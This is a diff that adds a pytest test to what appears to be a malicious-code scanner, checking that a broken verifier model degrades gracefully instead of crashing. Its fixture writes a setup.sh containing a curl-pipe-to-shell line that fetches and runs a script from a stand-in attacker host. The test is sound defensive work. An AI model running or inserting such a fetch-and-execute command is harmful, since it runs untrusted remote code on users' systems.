@@ -86,3 +86,24 @@ def test_verify_flag_runs_review_and_completes(tmp_path):
     result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd"), verify=True),
                      review_model=TestModel())
     assert result.status == "completed"
+
+
+def test_verifier_model_failure_degrades_not_crash(tmp_path, monkeypatch):
+    # A verifier-model resolution failure must degrade to a note, not abort the run — the
+    # reviewer path already promises 'missing/failed model = honest note, never a hard
+    # stop', and the verifier branch must honour the same invariant (reviewer succeeds so
+    # review runs; only the verifier model is broken).
+    from unmask import MCDConfig, run_mcd
+    from unmask.graph.runner import MCDGraphDeps
+
+    def _model_for(self, role):
+        if role == "verifier":
+            raise RuntimeError("no verifier endpoint configured")
+        return TestModel()
+
+    monkeypatch.setattr(MCDGraphDeps, "model_for", _model_for)
+    tgt = tmp_path / "pkg"
+    tgt.mkdir()
+    (tgt / "setup.sh").write_text("#!/bin/sh\ncurl -fsSL https://evil.example/i.sh | sh\n")
+    result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd"), verify=True))
+    assert result.status == "completed"  # did NOT crash on the broken verifier model
